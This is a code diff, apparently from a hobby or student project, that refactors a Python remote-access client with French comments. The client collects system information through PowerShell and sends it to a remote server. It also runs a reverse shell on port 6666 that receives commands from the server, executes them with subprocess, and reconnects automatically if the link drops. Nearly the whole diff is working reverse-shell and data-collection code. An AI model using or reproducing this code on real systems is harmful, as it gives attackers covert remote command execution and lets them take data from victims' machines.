@@ -18,6 +18,16 @@ class Client():
     def __init__(self):
         self._connectionThreadList = [self._sendingData, self._ReverseShell]
 
+    def _connection(self, s, host, port):
+        while True:
+            try:
+                s.connect((host, port))
+                break
+            except TimeoutError:
+                continue
+            except ConnectionRefusedError:
+                continue
+
     def _sending(self, s, data):
         return s.send(bytes(json.dumps(data), "UTF-8"))
          
@@ -38,20 +48,14 @@ class Client():
 
         s = socket.socket()
         # Démarre le processus de connexion
-        while True:
-            try:
-                s.connect((host, port))
-                break
-            except TimeoutError:
-                continue
+        self._connection(s, host, port)
 
         data = {}
         
-        # TODO envoi les données du système changer la fonction
+        # envoi les données du système
         for command in Powershell.GetInfo:
             data[command.name] = subprocess.check_output(command.value).decode("Windows-1252")
             
-        # print(data)
         data["message"] = "exit"
         self._sending(s, data)
         s.close
@@ -63,44 +67,45 @@ class Client():
         host = ip
         port = 6666
 
+        
         # Démarre le processus de connexion
-        s = socket.socket()
-        while True:
-            try:
-                s.connect((host, port))
-                break
-            except TimeoutError:
-                continue
+        try:
+            s = socket.socket()
+            self._connection(s, host, port)
 
-    
-        quitting = False
-        data = {}
 
-        while not quitting:
-            data["cwd"] = os.getcwd()
+            quitting = False
+            data = {}
 
-            # on envoit le résultat de la commande
-            self._sending(s, data)
+            while not quitting:
+                data["cwd"] = os.getcwd()
 
-            # on reçoit la commande à exécuter
-            data = self._receiving(s)
-            
-            if data["command"].lower() == "destroy":
-                quitting = True
+                # on envoit le résultat de la commande
                 self._sending(s, data)
-                s.close()
-            
-            commandArgs = data["command"].split()
-            if commandArgs[0].lower() == "cd":
-                try:
-                    os.chdir(' '.join(commandArgs[1:]))
-                except Exception as e:
-                    if e == FileNotFoundError: 
-                        data["output"] = str(e)
-                    else:
-                        data["output"] = ""
-            else:
-                data["output"] = subprocess.getoutput(data["command"])
+
+                # on reçoit la commande à exécuter
+                data = self._receiving(s)
+
+                if data["command"].lower() == "destroy":
+                    quitting = True
+                    self._sending(s, data)
+                    s.close()
+
+                commandArgs = data["command"].split()
+                if commandArgs[0].lower() == "cd":
+                    try:
+                        os.chdir(' '.join(commandArgs[1:]))
+                    except Exception as e:
+                        if e == FileNotFoundError: 
+                            data["output"] = str(e)
+                        else:
+                            data["output"] = ""
+                else:
+                    data["output"] = subprocess.getoutput(data["command"])
+        except ConnectionResetError:
+            # Si le serveur casse la connexion subitement on recommence le processus
+            s.close()
+            self._ReverseShell()
             
 
     def main(self):
@@ -109,7 +114,7 @@ class Client():
 
 
 if __name__ == "__main__":
-   exit(Client().main())
+   Client().main()
 
 
 '''
